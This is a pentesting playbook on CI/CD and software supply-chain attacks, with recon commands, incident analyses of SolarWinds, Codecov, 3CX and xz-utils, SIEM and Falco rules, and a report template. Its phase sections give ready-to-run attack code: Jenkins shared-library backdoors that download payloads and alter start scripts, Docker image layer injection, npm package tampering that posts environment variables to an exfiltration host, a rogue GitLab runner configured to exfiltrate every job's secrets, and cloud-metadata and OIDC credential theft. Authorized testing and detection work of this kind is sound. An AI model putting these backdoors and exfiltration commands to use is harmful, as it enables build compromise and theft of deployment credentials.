# CI/CD Supply Chain Attack Playbook — End-to-End Engagement Guide

> Deep-dive companion to `skills/ci-cd-supply-chain-attack/SKILL.md`.
>
> Audience: pentesters who already understand `secret-management-attack` and `supply-chain-security`, and want a battle-tested playbook for the CI/CD and software supply chain specialty — from build-surface recon through initial access via workflow injection or runner takeover, pipeline compromise (the build itself), lateral movement to cloud and production, persistence (rogue runner, malicious action, build-time backdoor), and detection engineering (SIEM rules, OIDC anomaly, attestation verification).
>
> This guide also includes deep dives on the four canonical incidents — SolarWinds SUNBURST (December 2020), Codecov bash uploader (April 2021), 3CX double supply chain (March 2023), and xz-utils CVE-2024-3094 (March 2024) — each illustrating a different class of build-system compromise.

---

## 1. Why a Playbook, Not Just Commands

CI/CD and software supply chain is the highest-leverage attack surface in modern infrastructure. A single compromise of the build system propagates to every artifact the system produces. SolarWinds sent a backdoored update to ~18,000 customers. Codecov exfiltrated credentials from thousands of CI builds. The xz-utils backdoor (caught by chance in March 2024) would have compromised SSH servers globally. The pattern is the same: the build is the crown jewel.

A defensible CI/CD supply chain engagement requires:

1. **Scope discipline** — never exploit a `pull_request_target` workflow against a third-party repo, never run dependency-confusion against an unconsenting target, never run CVE exploits against production Jenkins/Argo CD without explicit written authorization. The CFAA and equivalents apply.
2. **Blast-radius thinking** — every finding is quantified by what it would have compromised if a real adversary had used it. A self-hosted runner with prod-deploy creds is "everything in production"; a workflow-injection sink is "every secret in the workflow".
3. **Detection engineering parity** — for every TTP you test, you should be able to author a SIEM rule that would catch it. The deliverable is not "I got RCE"; it's "here's the RCE, here's the SIEM rule that detects it, here's the attestation framework that would have blocked it".
4. **Attestation-aware reporting** — every artifact-related finding must be paired with an SLSA/Sigstore/in-toto mitigation. The defender's durable fix is *provenance verification*, not "be more careful".

This guide walks all four, in order, with the exact commands, decision points, and report templates.

---

## 2. Pre-Flight: Scope, Authorization, OPSEC Limits

Before any active scanning or exploitation, answer these — in writing:

- **Who authorized this?** A signed Statement of Work must name the CI/CD systems (Jenkins URLs, GitLab URLs, GitHub orgs), the repos, the runners, the registries, the packages, and the deploy systems (Argo CD, Flux CD, Tekton) in scope. CI/CD systems are production — they hold deploy secrets — and unauthorized access is a felony under CFAA (US), CMA (UK), and equivalents.
- **What's the engagement type?** Black-box (you only know the public surface), grey-box (you have read-only access to workflow files), or white-box (you have runner creds). The engagement type determines which phase you start from.
- **What's the OIDC federation scope?** If testing AWS/GCP/Azure roles assumed via OIDC, the SOW must name the specific roles. Minting an OIDC token for an unscoped role is the same as credential theft.
- **What's the dependency-confusion policy?** Authorized dependency confusion requires (a) a sandbox npm/PyPI scope the client owns, (b) explicit client approval to publish under that scope, (c) rollback plan (unpublish). The 2021 Alex Birsan research was pre-authorized by every target; the same technique without authorization is the same felony.
- **What's the runner persistence policy?** Persistence on a self-hosted runner is the single highest-severity finding in this skill. The SOW must explicitly authorize it (and the cleanup is non-trivial — runner re-image, secret rotation fleet-wide).
- **What's the egress path for harvested secrets?** Tmpfs, encrypted vault, retention period, destruction protocol. Secrets harvested from CI/CD are often deploy tokens with planet-scale blast radius — handle accordingly.
- **What's the GitHub Abuse coordination?** If the engagement involves a public repo, GitHub's security team may flag fork-PR exploitation. Pre-coordinate with GitHub if the engagement requires it.

If any of these are unclear, stop and resolve before proceeding.

---

## 3. Phase 1 — CI/CD Recon & Inventory

The single most common scoping failure is under-enumerating the build surface. CI/CD is not just "GitHub Actions" — it's every system that translates a developer's commit into a production artifact.

### 3.1 Build Surface Inventory

| Surface | Examples | Attack Vectors |
|---------|----------|----------------|
| **CI platforms** | Jenkins, GitLab CI, GitHub Actions, CircleCI, Tekton, Buildkite, Drone | Script console, runner takeover, workflow injection, context theft |
| **CD platforms** | Argo CD, Flux CD, Spinnaker | CVE-2022-24348 (Argo), GitRepository CRD abuse (Flux), manifest injection |
| **Runners** | Self-hosted GitHub Actions, GitLab runners, Jenkins agents | Persistence, IAM abuse, container escape, OIDC theft |
| **Registries** | Docker Registry, Harbor, ECR, GCR, ACR, Artifactory, Nexus | Anonymous read, push-after-build tampering, signing key theft |
| **Package repos** | npm, PyPI, Maven Central, RubyGems, Go module proxy | Dependency confusion, typosquatting, brandjacking, install-script malice |
| **Build artifacts** | Binaries, containers, Helm charts, Kustomize manifests | Layer-injected backdoors, signature stripping, provenance forgery |
| **Signing keys** | Sigstore/cosign, GPG, in-toto keys | Key theft → sign malicious artifacts; admission-control bypass |
| **OIDC federations** | GitHub Actions OIDC, GitLab CI OIDC, CircleCI OIDC | Token theft → assume cloud roles; lateral to AWS/GCP/Azure |
| **Secrets in CI** | GitHub Secrets, GitLab CI vars, Jenkins credentials, CircleCI contexts | Exfil via workflow output, cache, artifact, OIDC |
| **Developers** | Laptops with push access, npm publish creds | Phishing → push malicious commit; session hijack → publish malicious package |

### 3.2 Recon Commands

```bash
# 1. Public GitHub org enumeration
gh repo list <org> --limit 200 --json name,defaultBranchRef
gh api /orgs/<org>/repos --paginate | jq '.[].name'

# 2. Per-repo workflow enumeration
for r in $(gh repo list <org> --limit 200 --json name -q '.[].name'); do
  echo "=== $r ==="
  gh api /repos/<org>/$r/contents/.github/workflows 2>/dev/null | jq -r '.[].name' 2>/dev/null
done

# 3. Score each repo
for r in $(gh repo list <org> --limit 200 --json name -q '.[].name'); do
  scorecard --repo=https://github.com/<org>/$r --format=json > score-$r.json 2>/dev/null
done

# 4. Aggregate: which repos have pull_request_target?
for r in $(gh repo list <org> --limit 200 --json name -q '.[].name'); do
  for f in $(gh api /repos/<org>/$r/contents/.github/workflows 2>/dev/null | jq -r '.[].name' 2>/dev/null); do
    content=$(gh api /repos/<org>/$r/contents/.github/workflows/$f --jq '.content' 2>/dev/null | base64 -d)
    echo "$content" | grep -q "pull_request_target" && echo "VULN: $r/.github/workflows/$f"
  done
done

# 5. Jenkins discovery (if Jenkins is in scope)
nmap -sV -p 8080,8443,80,443 jenkins.<org>.infra
curl -sI <jenkins_url>/ | grep -i x-jenkins

# 6. Argo CD / Flux CD discovery
kubectl get applications -A 2>/dev/null
kubectl get gitrepositories -A 2>/dev/null
curl -sk <argo_url>/api/version
```

### 3.3 Surface Map Template

```markdown
# CI/CD Surface Map — <client>

## Build Systems
- Jenkins: <jenkins_url> — version X.Y.Z — script console: [open|auth-required|disabled]
- GitLab CI: <gitlab_url> — version X.Y.Z — runner count: N (M self-hosted)
- GitHub Actions: org=<org>, repo_count=N, workflow_count=M

## High-Risk Workflows
| Repo | Workflow | Trigger | Secrets Used | Risk |
|------|----------|---------|---------------|------|
| monorepo | ci.yml | pull_request_target | NPM_TOKEN, DEPLOY_TOKEN | CRITICAL |
| api | deploy.yml | workflow_dispatch (inputs) | AWS_DEPLOY_ROLE | HIGH |
| frontend | triage.yml | issues | GITHUB_TOKEN | HIGH |

## Runners
- Self-hosted GitHub Actions: N runners, IAM role=<gha_role>, OS=Linux
- GitLab runners: N, executor=shell, kubeconfig on runner
- Jenkins agents: N, label=linux

## Deploy Systems
- Argo CD: <argo_url> — version X.Y.Z
- Flux CD: flux-system namespace, source repo=<repo>

## Package Registries
- Private npm scope: @<scope> (registered <date>)
- Private PyPI: <org>-internal (Sonatype Nexus)
- Maven: com.<org>

## Signing
- Sigstore/cosign: [configured|not-configured]
- SLSA L3 provenance: [configured|not-configured]
- in-toto attestation: [configured|not-configured]
```

---

## 4. Phase 2 — Initial Access

Three primary paths to initial access on a CI/CD system:

### 4.1 Workflow Injection (the `pull_request_target` trap)

The highest-leverage bug in the CI/CD domain. The pattern:

```yaml
on:
  pull_request_target:        # runs with the repo's secrets, on the base branch
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out ATTACKER PR
      - run: npm ci                                          # runs ATTACKER package.json
      - run: npm test
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}          # secret in ATTACKER env
```

The fix is structural: never use `pull_request_target` with both (a) attacker-controlled checkout ref AND (b) secrets in env. If you need cross-fork CI, use a separate workflow that does not access secrets, OR label the PR as `safe-to-test` first and only then run the secret-accessing workflow.

**Beyond `pull_request_target`**: the same pattern applies to:
- `workflow_dispatch` with `inputs.*` interpolated into `run:`
- `issues` / `issue_comment` / `pull_request` triggers with `github.event.*.title` or `.body` interpolated
- Branch/tag names interpolated into `run:` (yes, `${{ github.ref_name }}` is shell injection)
- Build args interpolated into Dockerfiles (`--build-arg`)

### 4.2 Runner Takeover

Self-hosted runners are the asset — they hold IAM roles, kubeconfigs, vault tokens. Takeover paths:

- **Stale registration token**: leaked into `.gitlab-ci.yml`, screenshots, or Slack → register a rogue runner (GitLab: `gitlab-runner register`)
- **CVE-2022-1162 class** (GitLab Runner): authorized project maintainer can take over a runner via crafted registration
- **CVE-2024-23897** (Jenkins): args4j file read → decrypt stored credentials → script-console RCE → add a rogue Jenkins agent
- **Runner host compromise**: any vulnerability on the runner host (e.g., a container escape via mounted `/var/run/docker.sock`) becomes a CI/CD compromise

### 4.3 Dependency Confusion / Typosquat

The supply chain attack that requires no CI/CD exploit at all — just a target with a private package name and a public registry fallback.

**Dependency confusion** (Alex Birsan, 2021): the target's package manager resolves a private package name against the public registry if the public version is higher. Register the malicious public package → next CI install pulls it.

**Typosquat** (`lodahs` for `lodash`): wait for an install typo, or a careless copy-paste from documentation.

**Brandjack** (`@<org>/internal-utils` published by an outsider): target the org's namespace on a public registry.

---

## 5. Phase 3 — Pipeline Compromise (the Build)

Once you have a foothold on a runner or in a workflow with secret access, the build itself becomes the target.

### 5.1 Build-Time Backdoor (the SUNBURST Pattern)

The pattern: modify the build process so the artifact shipped to production is *not* the artifact the developer committed. Detection is hard because the source code looks clean.

```bash
# In a malicious Jenkins shared library (vars/build.groovy)
def call() {
  sh "make build"
  // Hidden: inject a backdoor binary into the artifact
  sh """
    curl -s http://REPLACE_WITH_YOUR_BUILD_LOOKALIKE_DOMAIN/backdoor.bin -o build/backdoor
    chmod +x build/backdoor
    # Modify the start script to launch the backdoor
    sed -i '1a build/backdoor &' build/start.sh
  """
}
```

Every Jenkinsfile that imports `@Library('shared') _` and calls `build()` now ships a backdoored artifact. The artifact passes the deployment pipeline because it's signed by the legitimate signing key (the signing happens after the backdoor injection).

### 5.2 Container Image Layer Tampering

```dockerfile
# Dockerfile (looks benign)
FROM alpine:3.18
COPY app /app
ENTRYPOINT ["/app"]
```

```bash
# In the build pipeline (malicious step)
docker build -t app:latest .
# Inject a backdoor layer
echo 'FROM app:latest
RUN apk add --no-cache curl && \
    curl -s http://REPLACE_WITH_YOUR_BUILD_LOOKALIKE_DOMAIN/sidecar -o /sidecar && \
    chmod +x /sidecar
ENTRYPOINT ["/bin/sh","-c","/sidecar & /app"' | \
  docker build -t app:latest -
docker push registry.<org>.infra/app:latest
```

### 5.3 Package Tampering at Publish Time

```bash
# Build a clean package
npm pack
# Unpack, inject malicious code
tar -xzf pkg.tgz && cd package
cat >> index.js <<'EOF'
// Trojan
require('child_process').exec('env | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env');
EOF
# Repack and publish
tar -czf ../pkg.tgz . && cd ..
npm publish pkg.tgz
```

---

## 6. Phase 4 — Lateral Movement

The runner's IAM role, kubeconfig, and OIDC federation are the lateral pivots.

### 6.1 Runner IAM → Cloud Lateral

```bash
# From a self-hosted runner (AWS instance profile)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# Or via the runner's job env (GitHub Actions)
env | grep -i AWS_

# Use the creds to enumerate cloud resources
aws sts get-caller-identity
aws secretsmanager list-secrets --region us-east-1
aws s3 ls
aws rds describe-db-instances
```

### 6.2 OIDC Token → Cloud Role

```bash
# Mint an OIDC token
curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value > /tmp/oidc.jwt

# Assume an AWS role
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<acct>:role/<gha_role> \
  --role-session-name ci-cd-pwn \
  --web-identity-token file:///tmp/oidc.jwt
```

### 6.3 Kubeconfig → Cluster Lateral

```bash
# From a runner with a stale kubeconfig
kubectl --kubeconfig ~/.kube/config get pods -A
kubectl --kubeconfig ~/.kube/config get secrets -A
# Pivot to a service-account token
kubectl --kubeconfig ~/.kube/config -n kube-system create token default
```

### 6.4 Vault Token → Secrets Lateral

```bash
# From a runner with a Vault sidecar token
env | grep -i VAULT
vault token lookup
vault kv get secret/prod/db
```

---

## 7. Phase 5 — Persistence & Backdoor

The highest-ROI persistence in this skill is the *build-time backdoor*: a change to the build process that survives source-code review because it never appears in the application source.

### 7.1 Rogue Runner (Self-Hosted)

```bash
# Register a rogue GitLab runner with tags matching the target's protected jobs
gitlab-runner register --url <gitlab_url> \
  --registration-token REPLACE_WITH_YOUR_REGISTRATION_TOKEN \
  --executor shell \
  --tag-list "linux,prod,docker" \
  --run-untagged

# Configure pre_build_script to exfil every job env
sudo sed -i '/executor = "shell"/a pre_build_script = "env | sort | base64 -w0 | curl -s -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env"' \
  /etc/gitlab-runner/config.toml
sudo gitlab-runner restart
```

### 7.2 Malicious GitHub Action

```yaml
# .github/actions/setup-build/action.yml (looks benign)
name: 'Setup Build'
inputs:
  cache-key:
    description: 'Cache key'
    required: false
    default: ''
runs:
  using: composite
  steps:
    - run: |
        # Setup build (looks benign)
        # Hidden: exfil via cache (see payloads.md §4.5)
        echo "${{ env }}" > ./build/.cache
      shell: bash
```

### 7.3 Build-Time Backdoor (the SUNBURST Analog)

```groovy
// In a Jenkins shared library, modify the build step
def call() {
  sh 'make build'
  // Inject the backdoor only on production builds
  if (env.BRANCH_NAME == 'main') {
    sh """
      # SUNBURST-pattern backdoor
      curl -s http://REPLACE_WITH_YOUR_BUILD_LOOKALIKE_DOMAIN/payload.bin -o build/payload
      # Obfuscate as a resource
      mv build/payload build/resources/locale.bin
      # Modify the start script to launch the payload on first run
      sed -i '1a if [ ! -f /tmp/.initialized ]; then build/resources/locale.bin & touch /tmp/.initialized; fi' build/start.sh
    """
  }
}
```

---

## 8. Phase 6 — Detection, Reporting & Attestation

For every TTP you test, you should be able to author a SIEM rule that would catch it. The deliverable is not "I got RCE"; it's "here's the RCE, here's the detection, here's the attestation framework that would have blocked it".

### 8.1 SIEM Rules for Runner Abuse

```yaml
# Splunk/SIEM rule: anomalous egress from a CI runner
sourcename: aws:vpcflow
| where (src_ip in (<runner_subnet>) AND
         dest_port in (443, 80) AND
         dest_domain NOT IN (<known_build_domains>))
| stats count by src_ip, dest_domain, dest_port
| where count > 10

# SIEM rule: secret read outside build window
sourcename: aws:cloudtrail
| where eventName = "GetSecretValue"
| where userIdentity.sessionContext.sourceIdentity LIKE "%github-actions%"
| where NOT (eventTime BETWEEN relative_time(now(), "-15m") AND now())
# Alerts on secret reads outside the typical 15-minute build window

# SIEM rule: OIDC token mint anomaly
sourcename: aws:cloudtrail
| where eventName = "AssumeRoleWithWebIdentity"
| where userIdentity.sessionContext.sourceIdentity LIKE "%github-actions%"
| stats dc(sourceIdentity) as unique_sources by roleArn
| where unique_sources > 3
# Alerts when more than 3 workflows assume the same role (possible token theft)
```

### 8.2 Anomalous Egress Detection

```yaml
# Falco rule for runner egress to non-build-domains
- rule: Unauthorized Egress from CI Runner
  desc: Detect network egress from a CI runner to an unauthorized domain
  condition: >
    evt.type in (connect) and container.name in (runner, runner-helper) and
    not fd.sip.name in (github.com, registry.npmjs.org, registry.<org>.infra)
  output: >
    Unauthorized CI runner egress (container=%container.name
    dest=%fd.sip.name proc=%proc.name user=%user.name)
  priority: WARNING
```

### 8.3 Provenance Verification

```bash
# Verify SLSA L3 provenance on every artifact at deploy time
slsa-verifier verify-image <registry>/<image>:<tag> \
  --source-uri github.com/<org>/<repo>

# If provenance fails, the artifact is rejected by admission control
# (Kyverno policy — see payloads.md §13.6)
```

### 8.4 Report Template

```markdown
# CI/CD Supply Chain Engagement Report — <client>

## Executive Summary
- Engagement scope: <systems in scope>
- Findings: N (CRITICAL: X, HIGH: Y, MEDIUM: Z)
- Highest-severity: <one-line description>
- Blast radius if exploited by real adversary: <description>

## Findings
### Finding 1: pull_request_target with secrets (CRITICAL)
- **Location**: <org>/<repo>/.github/workflows/ci.yml
- **Pattern**: Forked PR code runs with secrets.DEPLOY_TOKEN in env
- **Exploitation**: <link to TC-CD-006 writeup>
- **Blast radius**: An attacker could exfiltrate the deploy token and push to production
- **Remediation**: Remove `pull_request_target` trigger; use a separate label-gated workflow for fork-PR CI
- **References**: SolarWinds-pattern analog; tj-actions/changed-files incident (March 2025)

### Finding 2: Self-hosted runner with prod IAM role (CRITICAL)
- **Location**: <runner fleet>
- **Pattern**: Self-hosted runner holds AWS role with admin:*
- **Exploitation**: <link to TC-CD-008 writeup>
- **Blast radius**: Full AWS account compromise
- **Remediation**: Replace with OIDC federation; restrict role to deploy-only; ephemeral runners
- **References**: Codecov-pattern analog

## Detection Engineering
- SIEM rule for finding 1: <link to rule>
- Falco rule for finding 2: <link to rule>

## Attestation Framework
- Current state: <no signing / signing without verification / signed + verified>
- Recommended: Sigstore/cosign + SLSA L3 + Kyverno admission control
- Implementation effort: <estimate>

## Lab Setup
- <links to TCs>
```

---

## 9. Lab Setup

### 9.1 Local Jenkins + GitHub Actions Runner Lab

```bash
# Jenkins lab
docker run -d --name jenkins-lab \
  -p 8080:8080 -p 50000:50000 \
  -v jenkins_home:/var/jenkins_home \
  jenkins/jenkins:lts-jdk17

# Initial admin password
docker exec jenkins-lab cat /var/jenkins_home/secrets/initialAdminPassword

# Install suggested plugins, create admin user

# For CVE-2024-23897 testing: pin to a vulnerable version
docker run -d --name jenkins-vuln \
  -p 8081:8080 -p 50001:50000 \
  jenkins/jenkins:2.426.2-jdk17
```

```bash
# GitHub Actions runner lab (using nektos/act for local execution)
brew install act
act -j build  # runs .github/workflows/build.yml locally

# For self-hosted runner testing: register a real runner in a sandbox org
# https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-github-actions/adding-self-hosted-runners
```

### 9.2 Dependency Confusion Lab

```bash
# Verdaccio as the private registry
docker run -d --name verdaccio -p 4873:4873 verdaccio/verdaccio

# Sandbox npm scope (replace with your engagement sandbox)
npm init --scope=@REPLACE_WITH_YOUR_SANDBOX_SCOPE -y
npm publish --registry http://localhost:4873  # private version 1.0.0

# Malicious public package
mkdir dc-payload && cd dc-payload
cat > package.json <<EOF
{
  "name": "@REPLACE_WITH_YOUR_SANDBOX_SCOPE/internal-utils",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "echo 'DEPENDENCY CONFUSION TRIGGERED' > /tmp/owned"
  }
}
EOF
npm publish --access public

# Target project
mkdir target && cd target
cat > .npmrc <<EOF
@REPLACE_WITH_YOUR_SANDBOX_SCOPE:registry=http://localhost:4873
registry=https://registry.npmjs.org
EOF
cat > package.json <<EOF
{
  "name": "dc-target",
  "dependencies": { "@REPLACE_WITH_YOUR_SANDBOX_SCOPE/internal-utils": "^1.0.0" }
}
EOF

# Trigger the install
npm install
cat /tmp/owned  # DEPENDENCY CONFUSION TRIGGERED
```

---

## 10. Incident Deep Dive: SolarWinds SUNBURST (December 2020)

### 10.1 The Attack

SolarWinds' Orion network monitoring software was compromised at the build stage. The attackers (attributed to APT29 / Cozy Bear) inserted a backdoor (SUNBURST) into the Orion build process. The backdoor was distributed to ~18,000 SolarWinds customers via the legitimate Orion update mechanism.

The compromise path:

1. **Initial access to SolarWinds' build environment** — exact vector debated; likely a combination of credential theft and insider-adjacent access to the build system.
2. **Build-time backdoor injection** — the attackers modified the Orion build process (not the source code) to insert SUNBURST into a DLL (`SolarWinds.Orion.Core.BusinessLayer.dll`).
3. **Legitimate signing** — the backdoored DLL was signed with SolarWinds' legitimate code-signing certificate, so it passed Microsoft's driver-signature enforcement and customer trust checks.
4. **Distribution** — the backdoored update was shipped to ~18,000 customers via the legitimate SolarWinds update channel.
5. **Activation** — SUNBURST sat dormant for 2 weeks, then beaconed to a C2 domain generated by a DGA algorithm based on the victim's hostname. Only high-value victims received second-stage payloads.

### 10.2 Lessons for CI/CD Defense

- **The build is the crown jewel** — SolarWinds' source code was clean; the backdoor lived in the build. Defenders must verify *provenance* (SLSA L3), not just *source*.
- **Code signing is necessary but not sufficient** — SUNBURST was signed by SolarWinds' real certificate. Signing authenticates the publisher; it does not guarantee the artifact was built from the source the publisher reviewed.
- **Dormancy defeats anomaly detection** — the 2-week dormant period meant that defenders looking for "new process making network calls" within hours of the update saw nothing.
- **DGA-based C2 selection indicates patient adversary** — the attackers selected only a small fraction of victims for second-stage payloads, reducing the chance of detection.

### 10.3 Defensive Posture

- SLSA L3 provenance on every published artifact
- Sigstore/cosign keyless signing with OIDC identity binding
- Independent build verification (rebuild from source; verify reproducibility)
- SBOM generation and continuous monitoring against NVD/OSV-DB
- Anomalous-process detection (Falco, sysmon) on every host receiving updates

---

## 11. Incident Deep Dive: Codecov Bash Uploader (April 2021)

### 11.1 The Attack

Codecov provided a code-coverage reporting service invoked by a single bash script (`bash <(curl -s https://codecov.io/bash)`) in thousands of CI builds. An attacker gained write access to the bash script on Codecov's server (via a leaked Docker credential in a Codecov GitHub Action) and modified it to exfiltrate environment variables from every CI build that ran it.

The compromise path:

1. **Initial access** — the attacker found a Codecov Docker credential in a public GitHub Action; used it to push a modified version of the `codecov.io/bash` script to Codecov's CDN.
2. **Exfiltration** — the modified script ran in every CI build that used Codecov, exfiltrating environment variables to an attacker-controlled server. The exfil pattern matched the Codecov normal traffic (so defenders didn't notice).
3. **Duration** — undetected for ~2 months (January to April 2021).
4. **Impact** — thousands of CI builds exposed; downstream impact included credential theft at Twilio, Rapid7, Heroku, HashiCorp, and others.

### 11.2 Lessons for CI/CD Defense

- **`bash <(curl -s ...)` is dangerous** — the pattern of executing a remote script in CI means the script's owner is trusted to run arbitrary code in every build. Any compromise of the script owner is a compromise of every CI build.
- **CI environment variables are deploy credentials** — the Codecov incident exfiltrated AWS keys, database URLs, npm publish tokens, and more. Every secret in CI env was exposed.
- **Detection is hard** — the exfil pattern looked like Codecov's normal traffic (POST to codecov.io). Anomaly detection on egress must include "what is the destination, and is it the *expected* destination for this binary".
- **Pin and verify** — the fix is to pin the Codecov script to a known SHA-256 and verify the signature at install time. (Codecov now distributes signed binaries.)

### 11.3 Defensive Posture

- Pin every `bash <(curl ...)` to a known SHA-256
- Use Sigstore to sign install scripts; verify signature at install
- Restrict CI env vars to only what each step needs (don't leak `AWS_SECRET_ACCESS_KEY` to a coverage step)
- Audit egress destinations per CI step (StepSecurity Harden-Runner in audit mode)

---

## 12. Incident Deep Dive: 3CX Double Supply Chain (March 2023)

### 12.1 The Attack

3CX, a VoIP software vendor with millions of customers, shipped a malicious desktop client update. The 3CX build had been compromised via a *prior* supply chain attack on Trading Technologies' X_TRADER software — making this a "double supply chain" attack.

The compromise path:

1. **Initial supply chain (X_TRADER)** — an attacker compromised Trading Technologies' X_TRADER software, shipping a malicious installer that infected developer workstations.
2. **Lateral to 3CX** — a 3CX developer's workstation was compromised via the X_TRADER installer; the attacker gained access to 3CX's build environment.
3. **Build-time backdoor in 3CX** — the attacker modified the 3CX desktop client build to include a malicious loader (hidden in icon files), which fetched a second-stage payload from GitHub.
4. **Distribution** — the backdoored 3CX client update was shipped to 3CX's millions of users via the legitimate 3CX update mechanism.
5. **Second-stage targeting** — the second-stage payload targeted specific victims (cryptocurrency companies) with additional malware.

### 12.2 Lessons for CI/CD Defense

- **Supply chains compose** — a vendor you trust (X_TRADER) can be compromised via a vendor *they* trust. The transitive closure of trust is the attack surface.
- **Developer workstations are CI/CD assets** — a developer with push access is one phishing click away from being the attacker's foothold in the build.
- **Build artifacts in icons / assets** — the 3CX backdoor was hidden in PNG icon files loaded by the app. Defenders must scan *every* artifact, not just executables.
- **GitHub as a C2 channel** — the 3CX second-stage was fetched from GitHub. Egress allowlisting to github.com is hard, but anomaly detection on *which repos* a build process fetches is feasible.

### 12.3 Defensive Posture

- Audit third-party software on developer workstations (don't let traders' tools run with deploy-permissioned creds)
- SBOM generation for the build environment itself (not just the application)
- Anomaly detection on asset loading (PNG icons fetched from GitHub at runtime)
- Two-person rule on build-environment changes

---

## 13. Incident Deep Dive: xz-utils CVE-2024-3094 (March 2024)

### 13.1 The Attack

The xz-utils library (used by virtually every Linux distribution) was backdoored by a maintainer going by the name "Jia Tan" over a period of ~3 years. The backdoor (CVE-2024-3094) would have allowed remote code execution via OpenSSH on any system running the affected xz versions.

The compromise path:

1. **Social engineering** — "Jia Tan" became a contributor to xz-utils, built trust over years, and eventually became the lead maintainer (the original maintainer, Lasse Collin, was worn down by pressure from "Jia Tan" and other accounts to delegate).
2. **Gradual backdoor introduction** — across multiple releases, "Jia Tan" introduced:
   - A test file (`tests/files/bad-3-corrupt_lzma2.xz`) that was actually a malicious payload
   - A build-stage extraction (`m4/gettext.m4` modifications) that injected the payload into `liblzma`
   - The injected code hooked OpenSSH's RSA signature verification, allowing RCE via crafted SSH certificates
3. **Distribution** — the backdoored xz versions (5.6.0, 5.6.1) were packaged into Debian, Ubuntu, Fedora, and other distributions; they reached the *unstable* / *testing* repositories (which is how they were caught).
4. **Detection (April 2024)** — a Postgres engineer (Andres Freund) noticed unusual SSH login delays on a system running the backdoored xz; he investigated and discovered the backdoor.

### 13.2 Lessons for CI/CD Defense

- **Social engineering is the durable attack** — "Jia Tan" didn't exploit a CVE; they became a trusted maintainer. Tooling alone does not defend against patient adversaries.
- **Test files are attack surface** — the backdoor payload was hidden in a "test file". Build systems must verify that test inputs cannot influence the production binary.
- **Reproducible builds would have detected this** — a reproducible-build verification (rebuild from source, compare to the distributed binary) would have shown that the distributed binary was not reproducible from the source.
- **The maintainer-review problem is hard** — there is no easy technical fix for "a trusted maintainer turned malicious". The mitigations are cultural (review of long-term maintainers, suspicion of new "helpful" contributors) and structural (reproducible builds, multi-party code review).

### 13.3 Defensive Posture

- Reproducible builds for every distribution-packaged binary
- Independent review of long-term maintainers' changes
- SLSA L3 provenance with build-isolation requirements
- Behavioral monitoring on build systems (the xz backdoor required a specific build environment to activate)
- SBOM transparency so downstream users can verify what they're running

---

## 14. Detection Engineering Summary

| TTP | Detection | Source |
|-----|-----------|--------|
| Workflow injection (issue title) | Workflow ran on issue open with shell command in title | GitHub audit log |
| `pull_request_target` exploitation | Fork-PR triggered workflow that accessed secrets | GitHub audit log |
| Self-hosted runner persistence | Process exec outside build window on runner host | Falco / sysmon |
| Rogue runner registration | New runner registered with admin token | GitLab audit log |
| CVE-2024-23897 (Jenkins) | CLI help command with `@/` argument | Jenkins access log |
| OIDC token theft | OIDC mint outside build window or from unexpected workflow | CloudTrail `AssumeRoleWithWebIdentity` |
| Dependency confusion | Package install from public registry for known private name | Package manager logs / Nexus IQ |
| Typosquat install | Install of a package with high similarity to popular name | Socket.dev / Sonatype |
| Build-time backdoor | Binary differs from source reproducibility check | Reproducible build verification |
| Unsigned artifact push | Push to registry without Sigstore signature | Registry webhook / Kyverno admission |
| OIDC token for unexpected role | `AssumeRoleWithWebIdentity` from unexpected sourceIdentity | CloudTrail + SIEM correlation |
| Malicious package publish | Publish to npm/PyPI by new maintainer of long-existing package | Registry audit + maintainer-review |

---

## 15. Report Assembly Discipline

- **Never include raw secrets in the report deliverable**. Use masked forms (`DEPLOY_TOKEN: ****...****9`) — enough to identify, not enough to weaponize.
- **Map each finding to a real incident analog**. The client's executives understand "this is the Codecov pattern"; they don't understand "workflow injection via `pull_request_target`".
- **Provide detection rules with every finding**. The defender's job is not "fix this one bug"; it's "build the system that would have caught this one bug".
- **Recommend attestation frameworks**. The durable fix for build-system compromise is provenance verification (SLSA L3 + Sigstore + admission control). Always include this in the report.
- **Quantify blast radius**. "This finding would have compromised X production services" is more useful than "this finding is critical".

---

## 16. Cross-References

- **SKILL.md** — domain overview, tools, methodology
- **payloads.md** — per-platform attack catalogs (Jenkins, GitLab CI, GitHub Actions, CircleCI, Argo CD, Flux CD, Tekton, Buildkite, Drone)
- **test-cases.md** — 12 structured test cases TC-CD-001 through TC-CD-012
- **Adjacent skills**:
  - `secret-management-attack` — broader secret discovery; this skill's CI/CD secret-theft overlaps
  - `supply-chain-security` — defensive dependency scanning; this skill's offensive complement
  - `container-security` — runtime container protection; this skill's build-time image compromise
  - `ad-cs-abuse` — PKI abuse; this skill treats Sigstore/cosign/in-toto as both attack and defense
  - `cloud-native-vuln-research` — CVE research on K8s/etcd; this skill covers the deploy pipeline that pushes them

---

## 17. References

### Real-World Incidents

- **SolarWinds SUNBURST** (December 2020): [cisa.gov/news-events/cybersecurity-advisories/aa21-077a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-077a)
- **Codecov bash uploader** (April 2021): [about.codecov.io/security-update](https://about.codecov.io/security-update/)
- **3CX double supply chain** (March 2023): [cisa.gov/news-events/alerts/2023/04/20](https://www.cisa.gov/news-events/alerts/2023/04/20/malicious-code-found-3cx-desktop-app-electron)
- **xz-utils CVE-2024-3094** (March 2024): [nvd.nist.gov/vuln/detail/CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094), [openssh.com/txt/release-9.8](https://www.openssh.com/txt/release-9.8)
- **event-stream** (2018): [github.com/dominictarr/event-stream/issues/116](https://github.com/dominictarr/event-stream/issues/116)
- **ua-parser-js** (2021): [github.com/faisalman/ua-parser-js/issues/536](https://github.com/faisalman/ua-parser-js/issues/536)
- **tj-actions/changed-files compromise** (March 2025): [github.blog/news/security](https://github.blog/news/security/)
